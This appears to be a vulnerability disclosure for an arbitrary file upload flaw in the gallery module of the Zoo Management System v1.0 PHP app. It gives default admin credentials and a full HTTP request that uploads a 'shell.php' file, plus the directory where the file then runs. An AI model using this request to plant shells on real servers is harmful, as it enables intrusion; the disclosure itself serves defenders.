# Zoo Management System v1.0 by pushpam02 has arbitrary code execution (RCE)

BUG_Author: Lime

Admind login account: admin@mail.com/Password@123

vendor: https://www.sourcecodester.com/php/15347/zoo-management-system-source-code-php-mysql-database.html

Vulnerability url: http://ip/ZooManagementSystem/admin/public_html/gallery

Loophole location：There is an arbitrary file upload vulnerability (RCE) in the picture upload point of the "gallery" file of the "Gallery" module in the background management system

Request package for file upload：

```sql
POST /ZooManagementSystem/admin/public_html/gallery HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/ZooManagementSystem/admin/public_html/gallery
Cookie: PHPSESSID=5d10vq7lgptbau7foskstiug7i
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------29223726215286
Content-Length: 330

-----------------------------29223726215286
Content-Disposition: form-data; name="image"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------29223726215286
Content-Disposition: form-data; name="submit_image"


-----------------------------29223726215286--
```

The files will be uploaded to this directory \ZooManagementSystem\img\gallery\image
![image](https://user-images.githubusercontent.com/54017627/183284637-f56d8506-3abf-43c7-942c-b6f7e2014f0f.png)

We visited the directory of the file in the browser and found that the code had been executed
![image](https://user-images.githubusercontent.com/54017627/183284654-2f2c005d-6c07-4f49-a8fe-06961e7d2cc9.png)
